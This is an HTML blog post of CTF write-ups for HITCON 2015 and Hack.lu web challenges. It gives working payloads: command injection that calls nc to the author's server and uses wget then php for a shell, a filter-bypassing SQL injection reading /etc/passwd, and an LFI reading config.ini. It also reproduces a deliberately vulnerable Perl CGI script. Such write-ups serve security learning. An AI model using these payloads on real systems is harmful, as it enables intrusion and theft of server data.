<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <title>lili_blog - Web Tricks</title>
        <link rel="stylesheet" href="/theme/css/main.css" />

        <!--[if IE]>
            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">lili_blog </a></h1>
                <nav><ul>
                    <li><a href="/category/category.html">Category</a></li>
                    <li><a href="/category/ctf-web.html">CTF web</a></li>
                    <li><a href="/category/injection.html">InJection</a></li>
                    <li><a href="/category/web.html">web</a></li>
                </ul></nav>
        </header><!-- /#banner -->

            <aside id="featured" class="body">
                <article>
                    <h1 class="entry-title"><a href="/Web Tricks (2).html">Web Security Tricks (2)</a></h1>
<footer class="post-info">
        <abbr class="published" title="2015-10-27T10:58:00+01:00">
                Published: 二 27 十月 2015
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/md4.html">MD4</a>
        </address>
<p>In <a href="/category/web.html">web</a>.</p>
<p>tags: <a href="/tag/web-tricks.html">Web Tricks</a> </p>
</footer><!-- /.post-info --><h2>Web Security Tricks (2)</h2>
<p><strong><em>Recently Collect From HITCON2015 &amp;&amp; HACK.LU</em></strong></p>
<h3>0x01. HITCON: BABY FIRST</h3>
<p>When open the URL, ther is the source code:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>

    <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="nv">$args</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">];</span>
    <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\w+$/&#39;</span><span class="p">,</span> <span class="nv">$args</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">)</span>
           <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/orange &quot;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nv">$args</span><span class="p">));</span>
<span class="cp">?&gt;</span>
</pre></div>


<p>The regular expression limit all we can input is digits and numbers and then pass the $args to the function <code>exec</code>.</p>
<p>After fuzzing, we found that the function exec would execute several orders when encountering <code>%0a</code>.Then come the first try:</p>
<div class="highlight"><pre><span></span>/?args[]=asd%0a&amp;args[]=nc&amp;args[]=45.78.2.21&amp;args[]=8888
</pre></div>


<p>Because of no <code>.</code> can be used, so we use long format of the ip.</p>
<div class="highlight"><pre><span></span>/?args[]=asd%0a&amp;args[]=nc&amp;args[]=760087061&amp;args[]=8888
</pre></div>


<p>As we except, nc -lvp 8888 at our VPS show the result.</p>
<p>Then we wanna got a shell with only numbers and letters.There are several ways to got the shell:</p>
<hr />
<ul>
<li>
<h4>The first way is to use tar.</h4>
</li>
</ul>
<blockquote>
<p>We begun by thinking of all commands which for their arguments don't need dashes. We almost instantly thought of tar. If we could pass a non-compressed archive to the PHP interpreter it should ignore everything besides PHP code enclosed in &lt;?php ?&gt;.</p>
</blockquote>
<div class="highlight"><pre><span></span>mkdir md4md4
cd md4md4
wget 760087061

tar cvf aaa md4md4
php aaa
</pre></div>


<ul>
<li>
<h4>The Second way is to use wget and 302 regirect to a ftp server and the ftp server will keep file name as original.</h4>
</li>
</ul>
<h3>0x02. HITCON: Giraffe's Coffee</h3>
<p>This is another web source audit one. All functions seems so security except the mt_rand();</p>
<p>After a long time research, I found mt_rand() can be predict if I known the original seed. And in the another way, there are tools(php_mt_seed_3.2) which can be used to burpt the seed with known rand number.</p>
<p>With known seed, the mt_rand() as well as token can be predicted. And then the admin password can be reset. Just login and get the flag.</p>
<div class="highlight"><pre><span></span>root@localhost ~/test# python a.py
ok. your new password: 0lbvvmkd10qh1fat

root@localhost ~/test# python a.py
Congratulations, the flag is hitcon{howsgiraffesfeeling?no!youonlythinkofyourself}
</pre></div>


<h3>0x03. HACK.LU: Module Loader</h3>
<p>A simple and apparent LFI, to be notice .htaccess should be test from ever .</p>
<p>In the .htaccess a dir name 3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae, I found a flag.php in that dir. Again use the LFI to read the flag.</p>
<h3>0x04. HACK.LU: Grading Board</h3>
<p>The description give a URL and a Diff patch. After auditing the diff file, it is like add a token function and a Bouncer class. 
The solution is that <code>sanitize</code> function do not filter the \ result in the escape of sql ''.</p>
<p>The problem is relatively simple, however the ability to look .diff file grows a lot, thanks to author.</p>
<h3>0x05. HACK.LU: Prof. M. Eista Hax</h3>
<p>A creative problem!</p>
<p>Register with PGP public key, and then login. And the email has the sql injection.</p>
<p>Besauce the offical PGP tools can not be used to generate non-email keys, so I found these two link:</p>
<div class="highlight"><pre><span></span>https://www.igolder.com/pgp/generate-key/

https://www.igolder.com/PGP/decryption/
</pre></div>


<p>union select ( ) are be filtered.</p>
<p>I use such payload:</p>
<div class="highlight"><pre><span></span>asdwd&#39; uniunionon seleselectct 1,hex((load_file((&#39;/etc/passwd&#39;)))),3,4,5
</pre></div>


<p>Then we can read anything we want in the server</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/perl</span>
<span class="c1"># Retardo code on purpose :P</span>
<span class="c1"># Iz retardo world.</span>

<span class="k">use</span> <span class="n">CGI</span><span class="p">;</span>
<span class="k">use</span> <span class="n">DBI</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Digest::</span><span class="n">MD5</span> <span class="sx">qw(md5_hex)</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Digest::</span><span class="n">SHA</span> <span class="sx">qw(sha256_hex)</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Crypt::Eksblowfish::</span><span class="n">Bcrypt</span> <span class="sx">qw(bcrypt_hash)</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Config::</span><span class="n">IniFiles</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">MIME::</span><span class="n">Base64</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Shadowd::Connector::</span><span class="n">CGI</span><span class="p">;</span>

<span class="nb">undef</span> <span class="vg">$/</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s">&#39;/tmp/&#39;</span><span class="p">;</span>

<span class="k">my</span> <span class="nv">$cfg</span> <span class="o">=</span> <span class="nn">Config::</span><span class="n">IniFiles</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="o">-</span><span class="n">file</span> <span class="o">=&gt;</span> <span class="s">&quot;../private/config.ini&quot;</span><span class="p">);</span>
<span class="k">my</span> <span class="nv">$dbh</span> <span class="o">=</span> <span class="n">DBI</span><span class="o">-&gt;</span><span class="nb">connect</span><span class="p">(</span><span class="s">&#39;DBI:mysql:database=ctf&#39;</span><span class="p">,</span> <span class="s">&#39;ctf&#39;</span><span class="p">,</span> <span class="nv">$cfg</span><span class="o">-&gt;</span><span class="n">val</span><span class="p">(</span><span class="s">&#39;Database&#39;</span><span class="p">,</span> <span class="s">&#39;Password&#39;</span><span class="p">));</span>

<span class="k">sub </span><span class="nf">get_template</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>

    <span class="nb">open</span> <span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">);</span>
    <span class="k">my</span> <span class="nv">$output</span> <span class="o">=</span> <span class="sr">&lt;FILE&gt;</span><span class="p">;</span>
    <span class="nb">close</span><span class="p">(</span><span class="n">FILE</span><span class="p">);</span>

    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">print_template</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>

    <span class="k">print</span> <span class="n">get_template</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">escape_string</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">@bad</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;\(&#39;</span><span class="p">,</span> <span class="s">&#39;\)&#39;</span><span class="p">,</span> <span class="s">&#39;\=&#39;</span><span class="p">,</span> <span class="s">&#39;\+&#39;</span><span class="p">,</span> <span class="s">&#39;\|&#39;</span><span class="p">,</span> <span class="s">&#39;\&amp;&#39;</span><span class="p">,</span> <span class="s">&#39;\%&#39;</span><span class="p">,</span> <span class="s">&#39;;&#39;</span><span class="p">,</span> <span class="s">&#39;union&#39;</span><span class="p">,</span> <span class="s">&#39;select&#39;</span><span class="p">);</span>

    <span class="k">foreach</span> <span class="k">my</span> <span class="nv">$element</span> <span class="p">(</span><span class="nv">@bad</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$input</span> <span class="o">=~</span> <span class="sr">s/$element//si</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">gen_password</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">@chars</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">..</span><span class="s">&quot;Z&quot;</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="o">..</span><span class="s">&quot;z&quot;</span><span class="p">,</span> <span class="s">&quot;0&quot;</span><span class="o">..</span><span class="s">&quot;9&quot;</span><span class="p">);</span>

    <span class="k">my</span> <span class="nv">$string</span><span class="p">;</span>
    <span class="nv">$string</span> <span class="o">.=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span> <span class="nv">@chars</span><span class="p">]</span> <span class="k">for</span> <span class="mi">1</span><span class="o">..</span><span class="mi">30</span><span class="p">;</span>

    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">get_hash</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>

    <span class="nv">$input</span> <span class="o">=</span> <span class="n">bcrypt_hash</span><span class="p">({</span>
        <span class="n">key_nul</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">cost</span> <span class="o">=&gt;</span> <span class="mi">8</span><span class="p">,</span>
        <span class="n">salt</span> <span class="o">=&gt;</span> <span class="s">&#39;1234&#39;</span> <span class="n">x</span> <span class="mi">4</span><span class="p">,</span>
    <span class="p">},</span> <span class="nv">$input</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">sha256_hex</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">do_gpg</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$path</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>

    <span class="k">my</span> <span class="nv">$data1</span> <span class="o">=</span> <span class="sb">`gpg --list-packets $path`</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s">&#39;Invalid gpg pubkey file.&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">@data2</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s">&quot;\n&quot;</span><span class="p">,</span> <span class="nv">$data1</span><span class="p">);</span>
    <span class="k">my</span> <span class="nv">@data3</span> <span class="o">=</span> <span class="nb">grep</span><span class="p">(</span><span class="sr">/user ID packet/</span><span class="p">,</span> <span class="nv">@data2</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$#data3</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s">&#39;No user id found.&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">$user_id</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$data3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=~</span><span class="sr"> /\:user ID packet\: &quot;(.*)&quot;/</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">my</span> <span class="nv">$id1</span> <span class="o">=</span> <span class="nv">$1</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$id1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s">&#39;User id is empty.&#39;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">elsif</span> <span class="p">(</span><span class="nv">$id1</span> <span class="o">=~</span><span class="sr"> /&lt;(.*?)&gt;/</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$user_id</span> <span class="o">=</span> <span class="n">escape_string</span><span class="p">(</span><span class="nv">$1</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$user_id</span> <span class="o">=</span> <span class="n">escape_string</span><span class="p">(</span><span class="nv">$id1</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s">&#39;User id is strange.&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">$data4</span> <span class="o">=</span> <span class="sb">`gpg --import $path 2&gt;&amp;1`</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">@data5</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s">&quot;\n&quot;</span><span class="p">,</span> <span class="nv">$data4</span><span class="p">);</span>
    <span class="k">my</span> <span class="nv">@data6</span> <span class="o">=</span> <span class="nb">grep</span><span class="p">(</span><span class="sr">/gpg: key/</span><span class="p">,</span> <span class="nv">@data5</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$#data6</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s">&#39;No key found.&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">$pub_id</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$data6</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=~</span><span class="sr"> /gpg\: key ([\w]*)/</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$pub_id</span> <span class="o">=</span> <span class="nv">$1</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s">&#39;Key is strange.&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">$sth_select</span> <span class="o">=</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="n">prepare</span><span class="p">(</span><span class="s">&quot;SELECT * FROM accounts WHERE user_id = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$user_id</span> <span class="o">.</span> <span class="s">&quot;&#39;&quot;</span><span class="p">);</span>
    <span class="nv">$sth_select</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$sth_select</span><span class="o">-&gt;</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s">&quot;Could not execute database query.&quot;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">$msg</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sth_select</span><span class="o">-&gt;</span><span class="n">rows</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">my</span> <span class="nv">$password</span> <span class="o">=</span> <span class="n">gen_password</span><span class="p">();</span>

        <span class="k">my</span> <span class="nv">$sth_insert</span> <span class="o">=</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="n">prepare</span><span class="p">(</span><span class="s">&quot;INSERT INTO accounts (path, user_id, pass, activated) VALUES (?, ?, ?, false)&quot;</span><span class="p">);</span>
        <span class="nv">$sth_insert</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$user_id</span><span class="p">,</span> <span class="n">get_hash</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>

        <span class="nv">$msg</span> <span class="o">=</span> <span class="s">&#39;Hello &#39;</span> <span class="o">.</span> <span class="nv">$user_id</span> <span class="o">.</span> <span class="s">&#39;, here is your password: &#39;</span> <span class="o">.</span> <span class="nv">$password</span> <span class="o">.</span> <span class="s">&#39;. Your account has to be activated by an admin.&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$msg</span> <span class="o">=</span> <span class="s">&#39;Account already existing: &#39;</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="k">my</span> <span class="nv">$ref</span> <span class="o">=</span> <span class="nv">$sth_select</span><span class="o">-&gt;</span><span class="n">fetchrow_hashref</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$msg</span> <span class="o">.=</span> <span class="s">&#39;(&#39;</span> <span class="o">.</span> <span class="nv">$ref</span><span class="o">-&gt;</span><span class="p">{</span><span class="s">&#39;id&#39;</span><span class="p">}</span> <span class="o">.</span> <span class="s">&#39;) &#39;</span> <span class="o">.</span> <span class="nv">$user_id</span> <span class="o">.</span> <span class="s">&#39; &#39;</span><span class="p">;</span>
            <span class="nv">$msg</span> <span class="o">.=</span> <span class="s">&#39;[&#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$ref</span><span class="o">-&gt;</span><span class="p">{</span><span class="s">&#39;path&#39;</span><span class="p">}</span> <span class="o">==</span> <span class="nv">$path</span> <span class="p">?</span> <span class="s">&#39;same&#39;</span> <span class="p">:</span> <span class="s">&#39;different&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s">&#39; key]&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">my</span> <span class="nv">$base64_msg</span> <span class="o">=</span> <span class="n">encode_base64</span><span class="p">(</span><span class="nv">$msg</span><span class="p">);</span>
    <span class="k">return</span> <span class="sb">`echo &#39;$base64_msg&#39; | base64 -d | gpg -r $pub_id -a --batch --always-trust --encrypt --ignore-valid-from`</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub </span><span class="nf">do_login</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$email</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$password</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>

    <span class="k">my</span> <span class="nv">$sth_select</span> <span class="o">=</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="n">prepare</span><span class="p">(</span><span class="s">&quot;SELECT * FROM accounts WHERE user_id = ? AND pass = ? AND activated = true&quot;</span><span class="p">);</span>
    <span class="nv">$sth_select</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="n">get_hash</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>

    <span class="k">return</span> <span class="p">(</span><span class="nv">$sth_select</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">my</span> <span class="nv">$post_max</span> <span class="o">=</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">10</span><span class="p">;</span>
<span class="nv">$</span><span class="nn">CGI::</span><span class="nv">POST_MAX</span> <span class="o">=</span> <span class="nv">$post_max</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CGI</span><span class="p">;</span>

<span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>

<span class="k">my</span> <span class="nv">$content_length</span> <span class="o">=</span> <span class="nb">defined</span> <span class="nv">$ENV</span><span class="p">{</span><span class="s">&#39;CONTENT_LENGTH&#39;</span><span class="p">}</span> <span class="p">?</span> <span class="nv">$ENV</span><span class="p">{</span><span class="s">&#39;CONTENT_LENGTH&#39;</span><span class="p">}</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$content_length</span> <span class="o">&gt;</span> <span class="nv">$post_max</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s">&#39;Too much data.&#39;</span><span class="p">;</span>
    <span class="nb">exit</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">my</span> <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;email&#39;</span><span class="p">);</span>
<span class="k">my</span> <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;password&#39;</span><span class="p">);</span>

<span class="k">my</span> <span class="nv">%templates</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">header</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/header.html&#39;</span><span class="p">,</span>
    <span class="n">footer</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/footer.html&#39;</span><span class="p">,</span>
    <span class="n">form</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/form.html&#39;</span><span class="p">,</span>
    <span class="n">error</span> <span class="o">=&gt;</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">)</span>
<span class="p">);</span>

<span class="n">print_template</span><span class="p">(</span><span class="nv">$templates</span><span class="p">{</span><span class="n">header</span><span class="p">});</span>
<span class="k">print</span> <span class="s">&#39;&lt;div class=&quot;output&quot;&gt;&#39;</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">do_login</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nv">$password</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s">&#39;The administration key for the grades is &#39;</span> <span class="o">.</span> <span class="nv">$cfg</span><span class="o">-&gt;</span><span class="n">val</span><span class="p">(</span><span class="s">&#39;CTF&#39;</span><span class="p">,</span> <span class="s">&#39;Flag&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s">&#39;.&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s">&#39;Wrong login data or deactivated account.&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">elsif</span> <span class="p">(</span><span class="nv">$email</span> <span class="o">||</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s">&#39;You have to enter an e-mail address and a password.&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$query</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;gpg_file&#39;</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span><span class="s">&#39;gpg_file&#39;</span><span class="p">);</span>
    <span class="k">my</span> <span class="nv">$input</span> <span class="o">=</span> <span class="sr">&lt;$file&gt;</span><span class="p">;</span>

    <span class="c1"># Secruti first!</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$input</span> <span class="o">=~</span><span class="sr"> /^([\w\s=..:;()!\/+-]*)$/s</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">my</span> <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="n">md5_hex</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>

        <span class="nb">open</span> <span class="p">(</span><span class="n">UPLOADFILE</span><span class="p">,</span> <span class="s">&#39;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$path</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">die</span> <span class="vg">$!</span><span class="p">;</span>
        <span class="nb">binmode</span> <span class="n">UPLOADFILE</span><span class="p">;</span>
        <span class="k">print</span> <span class="n">UPLOADFILE</span> <span class="nv">$input</span><span class="p">;</span>
        <span class="nb">close</span> <span class="n">UPLOADFILE</span><span class="p">;</span>

        <span class="k">print</span> <span class="n">do_gpg</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s">&#39;Invalid gpg key. Please use an ASCII-armored format.&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">print</span> <span class="s">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="n">print_template</span><span class="p">(</span><span class="nv">$templates</span><span class="p">{</span><span class="n">form</span><span class="p">});</span>
<span class="n">print_template</span><span class="p">(</span><span class="nv">$templates</span><span class="p">{</span><span class="n">footer</span><span class="p">});</span>
</pre></div>
</td></tr></table>

<blockquote>
<p>There is a ticky thing in perl list:</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="k">my</span> <span class="nv">%templates</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">header</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/header.html&#39;</span><span class="p">,</span>
    <span class="n">footer</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/footer.html&#39;</span><span class="p">,</span>
    <span class="n">form</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/form.html&#39;</span><span class="p">,</span>
    <span class="n">error</span> <span class="o">=&gt;</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">)</span>
<span class="p">);</span>
</pre></div>


<p><strong><em><code>If the input param 'error' is a list the templates will be like such thing:</code></em></strong></p>
<div class="highlight"><pre><span></span><span class="k">my</span> <span class="nv">%templates</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">header</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/header.html&#39;</span><span class="p">,</span>
    <span class="n">footer</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/footer.html&#39;</span><span class="p">,</span>
    <span class="n">form</span> <span class="o">=&gt;</span> <span class="s">&#39;templates/form.html&#39;</span><span class="p">,</span>
    <span class="n">error</span> <span class="o">=&gt;</span> <span class="s">&#39;aaaaa&#39;</span><span class="p">,</span>
    <span class="n">footer</span> <span class="o">=&gt;</span> <span class="s">&#39;bbbbb&#39;</span>
<span class="p">);</span>
</pre></div>


<p>Then an LFI come!</p>
<div class="highlight"><pre><span></span>/?error[]=aaaa&amp;error[]=footer&amp;error[]=./private/config.ini
</pre></div>                </article>
            </aside><!-- /#featured -->
                <section id="content" class="body">
                    <h1>Other articles</h1>
                    <hr />
                    <ol id="posts-list" class="hfeed">

            <li><article class="hentry">
                <header>
                    <h1><a href="/Web Tricks.html" rel="bookmark"
                           title="Permalink to Web Security Tricks (1)">Web Security Tricks (1)</a></h1>
                </header>

                <div class="entry-content">
<footer class="post-info">
